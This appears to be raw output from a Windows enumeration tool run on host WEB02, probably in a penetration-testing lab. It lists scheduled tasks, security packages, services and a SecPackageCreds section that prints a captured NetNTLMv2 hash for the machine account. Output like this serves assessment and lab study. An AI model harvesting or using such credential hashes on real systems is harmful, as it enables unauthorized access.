  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;;FA;;;SY)(A;;FA;;;BA)(A;;FRFX;;;IU)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT4H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {DDAFAEA2-8842-4E96-BADE-D44A8D676FDB}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   SmartRetry
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;GRGX;;;SU)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {F3A219C3-2698-4CBF-9C07-037EDB8E72E6}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   False
      StopAtDurationEnd             :   False
      Delay                         :   PT6M
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   False
      StartBoundary                 :   2013-12-31T17:00:00-07:00
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   False
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   False
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   False
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   False
      StartBoundary                 :   2013-12-31T17:00:00-07:00
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   WakeUpAndContinueUpdates
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;BA)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT4H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {0DC331EE-8438-49D5-A721-E10B937CE459}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   WakeUpAndScanForUpdates
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:(A;;FA;;;SY)(A;;FRFX;;;BA)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT4H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {D5A04D91-6FE6-4FE4-A98A-FEB4500C5AF7}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2013-12-31T17:00:00-07:00
      Interval                      :   P1D
      StopAtDurationEnd             :   False
      RandomDelay                   :   P1D
      ------------------------------

  Name                              :   Notifications
  Principal                         :
      GroupId                       :   Authenticated Users
      Id                            :   Creator
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   Location Notification
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;AU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\System32\LocationNotificationWindows.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   WindowsActionDialog
  Principal                         :
      GroupId                       :   Authenticated Users
      Id                            :   Creator
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   Location Notification
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FRFX;;;AU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Execute                       :   %windir%\System32\WindowsActionDialog.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   SystemSoundsService
  Principal                         :
      GroupId                       :   Users
      Id                            :   Group
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   System Sounds User Mode Agent
  Source                            :   Microsoft Corporation
  State                             :   Disabled
  SDDL                              :   D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;AU)
  Enabled                           :   False
  Date                              :   6/23/2005 2:48:00 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {2DEA658F-54C1-4227-AF9B-260AB5FC3543}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   LoginCheck
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;GRGX;;;SU)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   start pushtoinstall login
      Execute                       :   %windir%\system32\sc.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StartBoundary                 :   2016-12-31T17:00:00-07:00
      EndBoundary                   :   2016-12-31T17:00:00-07:00
      StopAtDurationEnd             :   False
      Delay                         :   PT5M
      ------------------------------

  Name                              :   Registration
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:P(A;;FA;;;SY)(A;;FA;;;BA)(A;;GRGX;;;SU)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   start pushtoinstall registration
      Execute                       :   %windir%\system32\sc.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2016-12-31T17:00:00-07:00
      Interval                      :   P20D
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   StartComponentCleanup
  Principal                         :
      GroupId                       :   
      Id                            :   System
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {752073A1-23F2-4396-85F0-8FDB879ED0ED}
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   Account Cleanup
  Principal                         :
      GroupId                       :   
      Id                            :   Author
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT30M
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   %windir%\System32\Windows.SharedPC.AccountManager.dll,StartMaintenance
      Execute                       :   %windir%\System32\rundll32.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   Collection
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;BU)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   False
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT10M
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /d /c %systemroot%\system32\silcollector.cmd publish
      Execute                       :   %systemroot%\system32\cmd.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTimeTrigger
      Enabled                       :   True
      StartBoundary                 :   2000-01-01T03:00:00
      Interval                      :   PT1H
      StopAtDurationEnd             :   False
      RandomDelay                   :   PT30M
      ------------------------------

  Name                              :   Configuration
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:P(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;BU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   False
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT2M
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /d /c %systemroot%\system32\silcollector.cmd configure
      Execute                       :   %systemroot%\system32\cmd.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT1M
      ------------------------------

  Name                              :   SpaceManagerTask
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   $(@%SystemRoot%\system32\spaceman.exe,-2)
  Description                       :   $(@%SystemRoot%\system32\spaceman.exe,-3)
  Source                            :   $(@%SystemRoot%\system32\spaceman.exe,-1)
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /Work
      Execute                       :   %windir%\system32\spaceman.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskBootTrigger
      Enabled                       :   False
      StopAtDurationEnd             :   False
      Delay                         :   PT2M
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   MaintenanceTasks
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   SYSTEM
  Author                            :   $(@%SystemRoot%\system32\Windows.StateRepositoryClient.dll,-600)
  Description                       :   $(@%SystemRoot%\system32\Windows.StateRepositoryClient.dll,-602)
  Source                            :   $(@%SystemRoot%\system32\Windows.StateRepositoryClient.dll,-601)
  State                             :   Ready
  SDDL                              :   D:(A;;GA;;;SY)(A;;FRFX;;;LS)(A;;FA;;;BA)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   %windir%\system32\Windows.StateRepositoryClient.dll,StateRepositoryDoMaintenanceTasks
      Execute                       :   %windir%\system32\rundll32.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   MsCtfMonitor
  Principal                         :
      GroupId                       :   Users
      Id                            :   AnyUser
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   
  Author                            :   
  Description                       :   TextServicesFramework monitor task
  Source                            :   Microsoft Corporation
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)(A;;FR;;;BU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT0S
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

  Name                              :   Windows Defender Cache Maintenance
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   Periodic maintenance task.
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   -IdleTask -TaskName WdCacheMaintenance
      Execute                       :   C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MpCmdRun.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   Windows Defender Cleanup
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   Periodic cleanup task.
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   -IdleTask -TaskName WdCleanup
      Execute                       :   C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MpCmdRun.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   Windows Defender Scheduled Scan
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   Periodic scan task.
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   Scan -ScheduleJob -ScanTrigger 55 -IdleScheduledJob
      Execute                       :   C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MpCmdRun.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskDailyTrigger
      Enabled                       :   True
      StartBoundary                 :   2000-01-01T04:02:40
      EndBoundary                   :   2100-01-01T00:00:00
      StopAtDurationEnd             :   False
      DaysInterval                  :   1
      ------------------------------

  Name                              :   Windows Defender Verification
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   Periodic verification task.
  Source                            :   
  State                             :   Ready
  SDDL                              :   
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   -IdleTask -TaskName WdVerification
      Execute                       :   C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2301.6-0\MpCmdRun.exe
      ------------------------------
  Triggers                          :
      ------------------------------

  Name                              :   Automatic-Device-Join
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   Register this computer if the computer is already joined to an Active Directory domain.
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:AI(A;;FA;;;NS)(A;;GA;;;SY)(A;ID;FA;;;BA)(A;ID;GRGX;;;AU)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT5M
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   $(Arg0) $(Arg1) $(Arg2)
      Execute                       :   %SystemRoot%\System32\dsregcmd.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      Delay                         :   PT1M
      ------------------------------
      Type                          :   MSFT_TaskEventTrigger
      Enabled                       :   True
      Duration                      :   P1D
      Interval                      :   PT1H
      StopAtDurationEnd             :   False
      Subscription                  :   <QueryList><Query Id="0" Path="Microsoft-Windows-User Device Registration/Admin"><Select Path="Microsoft-Windows-User Device Registration/Admin">*[System[Provider[@Name='Microsoft-Windows-User Device Registration'] and EventID=4096]]</Select></Query></QueryList>
      ------------------------------

  Name                              :   Recovery-Check
  Principal                         :
      GroupId                       :   INTERACTIVE
      Id                            :   InteractiveUsers
      LogonType                     :   Batch
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   
  Author                            :   
  Description                       :   Performs recovery check.
  Source                            :   
  State                             :   Disabled
  SDDL                              :   D:AI(A;;FA;;;NS)(A;;GA;;;SY)(A;ID;FA;;;BA)(A;ID;GRGX;;;AU)
  Enabled                           :   False
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT2H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   /checkrecovery
      Execute                       :   %SystemRoot%\System32\dsregcmd.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskLogonTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskSessionStateChangeTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      StateChange                   :   7
      ------------------------------

  Name                              :   OobeDiscovery
  Principal                         :
      GroupId                       :   
      Id                            :   LocalSystem
      LogonType                     :   Service
      RunLevel                      :   TASK_RUNLEVEL_HIGHEST
      UserId                        :   SYSTEM
  Author                            :   
  Description                       :   
  Source                            :   
  State                             :   Ready
  SDDL                              :   D:(A;;FA;;;BA)(A;;FA;;;SY)
  Enabled                           :   True
  Date                              :   1/1/0001 12:00:00 AM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   False
  ExecutionTimeLimit                :   PT1H
  StopIfGoingOnBatteries            :   False
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      ClassId                       :   {C93CF9D5-031B-4AAA-AB0B-EF802347B381}
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------
      Type                          :   MSFT_TaskTrigger
      Enabled                       :   True
      StopAtDurationEnd             :   False
      ------------------------------

====== SearchIndex ======

ERROR: Unable to query the Search Indexer, Search Index is likely not running.
====== SecPackageCreds ======

  Version                        : NetNTLMv2
  Hash                           : WEB02$::MEDTECH:1122334455667788:89666cc0ae2c3b0de797c53e1fd2d166:010100000000000025c77e3d36dcda01555757ebbf97ca8d000000000800300030000000000000000000000000300000b8ee48a37762a8eb1c589e6fdb9e87abaedf6ca1e0764c5ccd0a0a206389a6340a00100000000000000000000000000000000000090000000000000000000000

====== SecurityPackages ======

Security Packages


  Name                           : Negotiate
  Comment                        : Microsoft Package Negotiator
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, NEGOTIABLE, GSS_COMPATIBLE, LOGON, RESTRICTED_TOKENS, APPCONTAINER_CHECKS
  MaxToken                       : 48256
  RPCID                          : 9
  Version                        : 1

  Name                           : NegoExtender
  Comment                        : NegoExtender Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, IMPERSONATION, NEGOTIABLE, GSS_COMPATIBLE, LOGON, MUTUAL_AUTH, NEGO_EXTENDER, APPCONTAINER_CHECKS
  MaxToken                       : 12000
  RPCID                          : 30
  Version                        : 1

  Name                           : Kerberos
  Comment                        : Microsoft Kerberos V1.0
  Capabilities                   : 42941375
  MaxToken                       : 48000
  RPCID                          : 16
  Version                        : 1

  Name                           : NTLM
  Comment                        : NTLM Security Package
  Capabilities                   : 42478391
  MaxToken                       : 2888
  RPCID                          : 10
  Version                        : 1

  Name                           : TSSSP
  Comment                        : TS Service Security Package
  Capabilities                   : CONNECTION, MULTI_REQUIRED, ACCEPT_WIN32_NAME, MUTUAL_AUTH, APPCONTAINER_CHECKS
  MaxToken                       : 13000
  RPCID                          : 22
  Version                        : 1

  Name                           : pku2u
  Comment                        : PKU2U Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, IMPERSONATION, GSS_COMPATIBLE, MUTUAL_AUTH, NEGOTIABLE2, APPCONTAINER_CHECKS
  MaxToken                       : 12000
  RPCID                          : 31
  Version                        : 1

  Name                           : CloudAP
  Comment                        : Cloud AP Security Package
  Capabilities                   : LOGON, NEGOTIABLE2, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 0
  RPCID                          : 36
  Version                        : 1

  Name                           : WDigest
  Comment                        : Digest Authentication for Windows
  Capabilities                   : TOKEN_ONLY, IMPERSONATION, ACCEPT_WIN32_NAME, APPCONTAINER_CHECKS
  MaxToken                       : 4096
  RPCID                          : 21
  Version                        : 1

  Name                           : Schannel
  Comment                        : Schannel Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 24576
  RPCID                          : 14
  Version                        : 1

  Name                           : Microsoft Unified Security Protocol Provider
  Comment                        : Schannel Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 24576
  RPCID                          : 14
  Version                        : 1

  Name                           : Default TLS SSP
  Comment                        : Schannel Security Package
  Capabilities                   : INTEGRITY, PRIVACY, CONNECTION, MULTI_REQUIRED, EXTENDED_ERROR, IMPERSONATION, ACCEPT_WIN32_NAME, STREAM, MUTUAL_AUTH, APPCONTAINER_PASSTHROUGH
  MaxToken                       : 24576
  RPCID                          : 14
  Version                        : 1

====== Services ======

Non Microsoft Services (via WMI)

  Name                           : GatewayService
  DisplayName                    : Azure Gateway Service
  Description                    : Provides site-to-site connectivity using IKEv2 protocol.
  User                           : NT AUTHORITY\LocalService
  State                          : Stopped
  StartMode                      : Disabled
  ServiceCommand                 : system32\SvcHost.exe -k LocalService
  BinaryPath                     : 
  BinaryPathSDDL                 : 
  ServiceDll                     : C:\Windows\System32\gtservice.dll
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : 
  FileDescription                : 
  Version                        : 
  IsDotNet                       : 

  Name                           : GISvc
  DisplayName                    : GISvc
  Description                    : VMware AppDefense PRA service
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
  ServiceCommand                 : "C:\Program Files\VMware\VMware Tools\gisvc.exe"
  BinaryPath                     : C:\Program Files\VMware\VMware Tools\gisvc.exe
  BinaryPathSDDL                 : O:SYD:(A;ID;FA;;;BA)(A;ID;0x1200a9;;;WD)(A;ID;FA;;;SY)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : VMware Inc.
  FileDescription                : VMware AppDefense PRA Service
  Version                        : 2.3.1.0
  IsDotNet                       : False

  Name                           : GwHMSvc
  DisplayName                    : Gateway Health Monitoring Service
  Description                    : Offers monitoring for the gateway health.
  User                           : NT AUTHORITY\LocalService
  State                          : Stopped
  StartMode                      : Manual
  ServiceCommand                 : system32\SvcHost.exe -k LocalService -p
  BinaryPath                     : 
  BinaryPathSDDL                 : 
  ServiceDll                     : C:\Windows\System32\GatewayHealthMonitorService.dll
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
  CompanyName                    : 
  FileDescription                : 
  Version                        : 
  IsDotNet                       : 

  Name                           : ssh-agent
  DisplayName                    : OpenSSH Authentication Agent
  Description                    : Agent to hold private keys used for public key authentication.
  User                           : LocalSystem
  State                          : Stopped
  StartMode                      : Disabled
  ServiceCommand                 : C:\Windows\System32\OpenSSH\ssh-agent.exe
  BinaryPath                     : C:\Windows\System32\OpenSSH\ssh-agent.exe
  BinaryPathSDDL                 : O:S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464D:PAI(A;;0x1200a9;;;SY)(A;;0x1200a9;;;BA)(A;;0x1200a9;;;BU)(A;;FA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464)(A;;0x1200a9;;;AC)(A;;0x1200a9;;;S-1-15-2-2)
  ServiceDll                     : 
  ServiceSDDL                    : O:SYD:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;RP;;;AU)
  CompanyName                    : 
  FileDescription                : 
  Version                        : 8.1.0.1
  IsDotNet                       : False

  Name                           : VGAuthService
  DisplayName                    : VMware Alias Manager and Ticket Service
  Description                    : Alias Manager and Ticket Service
  User                           : LocalSystem
  State                          : Running
  StartMode                      : Auto
